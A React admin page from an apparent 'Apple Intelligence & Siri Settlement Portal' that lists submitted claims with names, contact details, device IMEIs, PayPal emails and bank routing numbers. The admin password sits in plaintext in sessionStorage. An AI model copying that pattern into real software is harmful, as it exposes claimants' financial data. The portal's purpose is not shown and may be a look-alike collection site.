import { createFileRoute, Link, useNavigate } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import { Folder, Lock, ArrowLeft, FileText, User, Mail, Phone, MapPin, Smartphone, CreditCard, DollarSign, Calendar, RefreshCw } from "lucide-react";
import { listClaimsAdmin } from "@/lib/claims.functions";

export const Route = createFileRoute("/admin")({
  head: () => ({
    meta: [
      { title: "Admin — Apple Intelligence & Siri Settlement Portal" },
      { name: "robots", content: "noindex" },
    ],
  }),
  component: Admin,
});

const SESSION_FLAG = "admin:unlocked";
const SESSION_PW = "admin:pw";

const PAYMENT_NAMES: Record<string, string> = {
  paypal: "PayPal",
  ach: "ACH Direct Deposit",
  echeck: "Electronic Check",
  paper: "Paper Check",
};

type DeviceEntry = {
  model?: string;
  purchaseDate?: string;
  imeiSerial?: string;
  proofFileName?: string | null;
};

type Claim = {
  id?: string;
  submittedAt?: string;
  tier?: string;
  tierName?: string;
  amount?: number;
  firstName?: string;
  lastName?: string;
  email?: string;
  phone?: string;
  address?: string;
  city?: string;
  stateVal?: string;
  zip?: string;
  deviceInfo?: string;
  purchaseDate?: string;
  imeiSerial?: string;
  proofFileName?: string | null;
  devices?: DeviceEntry[];
  payment?: string;
  paypalEmail?: string;
  accountType?: string;
  routing?: string;
  accountLast4?: string;
  mailingSameAsAddress?: boolean;
};

function currency(n?: number) {
  if (typeof n !== "number") return "—";
  return n.toLocaleString("en-US", { style: "currency", currency: "USD", maximumFractionDigits: 0 });
}

function Admin() {
  const navigate = useNavigate();
  const [unlocked, setUnlocked] = useState(false);
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [claims, setClaims] = useState<Claim[]>([]);

  const loadClaims = async (pw: string) => {
    setLoading(true);
    setError("");
    try {
      const res = await listClaimsAdmin({ data: { password: pw } });
      const parsed = JSON.parse(res.claimsJson) as Claim[];
      setClaims(parsed);
      sessionStorage.setItem(SESSION_FLAG, "1");
      sessionStorage.setItem(SESSION_PW, pw);
      setUnlocked(true);
    } catch (e) {
      sessionStorage.removeItem(SESSION_FLAG);
      sessionStorage.removeItem(SESSION_PW);
      setUnlocked(false);
      setError("Incorrect password or unable to load claims.");
      console.error(e);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    const saved = sessionStorage.getItem(SESSION_PW);
    if (sessionStorage.getItem(SESSION_FLAG) === "1" && saved) {
      void loadClaims(saved);
    }
  }, []);

  const handleUnlock = (e: React.FormEvent) => {
    e.preventDefault();
    void loadClaims(password);
  };

  const handleLock = () => {
    sessionStorage.removeItem(SESSION_FLAG);
    sessionStorage.removeItem(SESSION_PW);
    setUnlocked(false);
    setPassword("");
    setClaims([]);
  };

  if (!unlocked) {
    return (
      <section className="mx-auto flex min-h-[70vh] max-w-md items-center px-4 py-16">
        <div className="w-full rounded-2xl border border-border bg-card p-8 shadow-elevated">
          <div className="mx-auto flex h-14 w-14 items-center justify-center rounded-full bg-secondary text-primary">
            <Lock className="h-6 w-6" />
          </div>
          <h1 className="mt-5 text-center text-2xl font-bold tracking-tight">Admin Access</h1>
          <p className="mt-2 text-center text-sm text-muted-foreground">
            Enter the admin password to open the Apple Intelligence &amp; Siri Settlement Portal folder.
          </p>
          <form onSubmit={handleUnlock} className="mt-6 space-y-3">
            <input
              type="password"
              autoFocus
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Password"
              className="w-full rounded-lg border border-border bg-background px-4 py-2.5 text-sm outline-none focus:ring-2 focus:ring-primary/40"
            />
            {error && <div className="text-sm text-destructive">{error}</div>}
            <button
              type="submit"
              disabled={loading || !password}
              className="w-full rounded-lg bg-primary px-4 py-2.5 text-sm font-semibold text-primary-foreground transition hover:opacity-90 disabled:opacity-50"
            >
              {loading ? "Opening…" : "Open Folder"}
            </button>
            <button
              type="button"
              onClick={() => navigate({ to: "/" })}
              className="w-full rounded-lg border border-border bg-background px-4 py-2.5 text-sm font-medium transition hover:bg-secondary"
            >
              Cancel
            </button>
          </form>
        </div>
      </section>
    );
  }

  return (
    <section className="mx-auto max-w-3xl px-4 py-10">
      <div className="flex flex-wrap items-start justify-between gap-4">
        <div>
          <div className="flex items-center gap-3">
            <div className="flex h-11 w-11 items-center justify-center rounded-lg bg-accent/10 text-accent">
              <Folder className="h-5 w-5" />
            </div>
            <h1 className="text-2xl font-bold tracking-tight sm:text-3xl">
              Apple Intelligence &amp; Siri Settlement Portal
            </h1>
          </div>
          <p className="mt-2 text-sm text-muted-foreground">
            {claims.length} submitted {claims.length === 1 ? "claim" : "claims"} — permanently saved.
          </p>
        </div>
        <div className="flex gap-2">
          <button
            onClick={() => void loadClaims(sessionStorage.getItem(SESSION_PW) ?? "")}
            className="inline-flex items-center gap-2 rounded-lg border border-border bg-background px-3 py-2 text-sm font-medium transition hover:bg-secondary"
            disabled={loading}
          >
            <RefreshCw className={`h-4 w-4 ${loading ? "animate-spin" : ""}`} /> Refresh
          </button>
          <button
            onClick={handleLock}
            className="rounded-lg border border-border bg-background px-3 py-2 text-sm font-medium transition hover:bg-secondary"
          >
            Lock
          </button>
        </div>
      </div>

      {/* Vertical scrolling list of claims */}
      <div className="mt-8 space-y-5">
        {claims.length === 0 ? (
          <div className="rounded-2xl border border-dashed border-border bg-card p-12 text-center">
            <FileText className="mx-auto h-8 w-8 text-muted-foreground" />
            <p className="mt-3 text-sm text-muted-foreground">No claims have been submitted yet.</p>
          </div>
        ) : (
          claims.map((c, i) => (
            <article
              key={String(c.id ?? i)}
              className="overflow-hidden rounded-2xl border border-border bg-card shadow-card"
            >
              <header className="flex flex-wrap items-center justify-between gap-2 border-b border-border bg-background px-5 py-3">
                <div>
                  <div className="text-[11px] font-semibold uppercase tracking-widest text-muted-foreground">Claim ID</div>
                  <div className="font-mono text-sm font-bold">{c.id}</div>
                </div>
                <div className="text-right">
                  <div className="text-[11px] font-semibold uppercase tracking-widest text-muted-foreground">Amount</div>
                  <div className="text-base font-bold">{currency(c.amount)}</div>
                </div>
              </header>

              <div className="divide-y divide-border/70 px-5">
                <Field icon={Calendar} label="Submitted" value={c.submittedAt ? new Date(c.submittedAt).toLocaleString() : "—"} />
                <Field icon={FileText} label="Claim Type" value={c.tierName ?? "—"} />
                <Field icon={User} label="Full Name" value={`${c.firstName ?? ""} ${c.lastName ?? ""}`.trim() || "—"} />
                <Field icon={Mail} label="Email" value={c.email ?? "—"} />
                <Field icon={Phone} label="Cell Phone" value={c.phone || "—"} />
                <Field
                  icon={MapPin}
                  label="Mailing Address"
                  value={[c.address, c.city, c.stateVal, c.zip].filter(Boolean).join(", ") || "—"}
                />

                {/* Devices */}
                {(c.devices && c.devices.length > 0 ? c.devices : [{
                  model: c.deviceInfo, purchaseDate: c.purchaseDate, imeiSerial: c.imeiSerial, proofFileName: c.proofFileName,
                }]).map((d, di) => (
                  <div key={di} className="py-3">
                    <div className="mb-1 flex items-center gap-2 text-[11px] font-semibold uppercase tracking-widest text-muted-foreground">
                      <Smartphone className="h-3.5 w-3.5" /> Device {di + 1}
                    </div>
                    <div className="grid gap-1 pl-5 text-sm">
                      <div><span className="text-muted-foreground">Model:</span> <span className="font-medium">{d.model || "—"}</span></div>
                      <div><span className="text-muted-foreground">Purchased:</span> <span className="font-medium">{d.purchaseDate ? new Date(d.purchaseDate).toLocaleDateString() : "—"}</span></div>
                      <div><span className="text-muted-foreground">IMEI/Serial:</span> <span className="font-mono text-xs">{d.imeiSerial || "—"}</span></div>
                      {d.proofFileName && <div><span className="text-muted-foreground">Proof:</span> <span className="font-medium">{d.proofFileName}</span></div>}
                    </div>
                  </div>
                ))}

                {/* Payment */}
                <div className="py-3">
                  <div className="mb-1 flex items-center gap-2 text-[11px] font-semibold uppercase tracking-widest text-muted-foreground">
                    <CreditCard className="h-3.5 w-3.5" /> Payment Method
                  </div>
                  <div className="grid gap-1 pl-5 text-sm">
                    <div><span className="text-muted-foreground">Method:</span> <span className="font-medium">{PAYMENT_NAMES[c.payment ?? ""] ?? c.payment ?? "—"}</span></div>
                    {c.payment === "paypal" && <div><span className="text-muted-foreground">PayPal Email:</span> <span className="font-medium">{c.paypalEmail}</span></div>}
                    {c.payment === "ach" && (
                      <>
                        <div><span className="text-muted-foreground">Account Type:</span> <span className="font-medium">{c.accountType}</span></div>
                        <div><span className="text-muted-foreground">Routing:</span> <span className="font-mono text-xs">{c.routing}</span></div>
                        <div><span className="text-muted-foreground">Account:</span> <span className="font-mono text-xs">••••{c.accountLast4}</span></div>
                      </>
                    )}
                  </div>
                </div>
              </div>
            </article>
          ))
        )}
      </div>

      <div className="mt-10">
        <Link to="/" className="inline-flex items-center gap-2 text-sm font-medium text-accent hover:underline">
          <ArrowLeft className="h-4 w-4" /> Back to home
        </Link>
      </div>
    </section>
  );
}

function Field({ icon: Icon, label, value }: { icon: React.ComponentType<{ className?: string }>; label: string; value: string }) {
  return (
    <div className="flex items-start gap-3 py-3">
      <Icon className="mt-0.5 h-4 w-4 shrink-0 text-muted-foreground" />
      <div className="flex-1 min-w-0">
        <div className="text-[11px] font-semibold uppercase tracking-widest text-muted-foreground">{label}</div>
        <div className="text-sm font-medium break-words">{value}</div>
      </div>
    </div>
  );
}
